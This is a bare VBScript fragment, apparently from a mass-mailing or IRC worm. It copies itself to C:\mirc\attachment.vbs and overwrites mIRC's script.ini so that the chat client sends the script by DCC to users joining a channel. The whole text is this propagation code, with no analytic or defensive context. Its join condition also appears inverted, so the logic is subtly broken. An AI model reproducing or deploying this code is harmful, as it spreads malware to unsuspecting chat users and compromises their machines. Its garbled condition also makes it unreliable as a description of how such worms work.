   Dim mirc
   set fso=CreateObject("Scripting.FileSystemObject")
   set mirc=fso.CreateTextFile("C:\mirc\script.ini")
   fso.CopyFile Wscript.ScriptFullName, "C:\mirc\attachment.vbs", True
   mirc.WriteLine "[script]"
   mirc.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\attachment.vbs }
   mirc.Close
